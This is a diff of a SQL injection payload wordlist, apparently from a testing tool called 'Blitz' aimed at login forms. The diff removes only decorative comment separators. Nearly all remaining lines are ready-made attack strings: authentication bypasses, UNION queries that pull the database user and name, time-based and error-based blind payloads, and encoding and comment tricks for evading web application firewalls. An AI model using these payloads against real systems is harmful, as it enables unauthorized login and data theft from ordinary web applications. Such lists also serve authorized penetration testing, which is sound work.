@@ -1,11 +1,7 @@
-# ==============================================
 # Blitz - SQL Injection Payloads
 # For testing login forms for SQLi vulnerabilities
-# ==============================================
 
-# ------------------------------------------------------------------
 # BASIC AUTHENTICATION BYPASS
-# ------------------------------------------------------------------
 ' or '1'='1
 ' or true--
 " or "1"="1
@@ -21,9 +17,7 @@ or 0=0 --
 " or 0=0 #
 or 0=0 #
 
-# ------------------------------------------------------------------
 # UNION BASED
-# ------------------------------------------------------------------
 ' UNION SELECT null--
 ' UNION SELECT null,null--
 ' UNION SELECT null,null,null--
@@ -34,9 +28,7 @@ or 0=0 #
 ' UNION SELECT user()--
 ' UNION SELECT database()--
 
-# ------------------------------------------------------------------
 # TIME-BASED (BLIND SQLI)
-# ------------------------------------------------------------------
 ' OR SLEEP(5)--
 ' OR pg_sleep(5)--
 ' OR WAITFOR DELAY '00:00:05'--
@@ -44,16 +36,12 @@ or 0=0 #
 ' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
 ' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=DATABASE())>0 AND SLEEP(5)--
 
-# ------------------------------------------------------------------
 # ERROR-BASED
-# ------------------------------------------------------------------
 ' AND extractvalue(1,concat(0x7e,version()))--
 ' AND updatexml(1,concat(0x7e,version()),1)--
 ' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
 
-# ------------------------------------------------------------------
 # WAF BYPASS / OBFUSCATED
-# ------------------------------------------------------------------
 '/**/OR/**/'1'='1
 '%0AOR%0A'1'='1
 '%09OR%0A'1'='1
@@ -68,18 +56,14 @@ or 0=0 #
 'union%0Dselect
 'union%20select
 
-# ------------------------------------------------------------------
 # COMMENT-BASED BYPASS
-# ------------------------------------------------------------------
 '/*!50000OR*/'1'='1
 '/*!OR*/'1'='1
 '/**/OR/**/'1'='1
 '/**_**/OR/**/'1'='1
 '/*random*/OR/*random*/'1'='1
 
-# ------------------------------------------------------------------
 # MODERN/ADVANCED PAYLOADS
-# ------------------------------------------------------------------
 ' OR (SELECT 1 FROM DUAL WHERE 1=1 AND 1=1)--
 ' OR (SELECT 1 FROM DUAL WHERE 1=1)--
 ' OR (SELECT 1 FROM DUAL)--
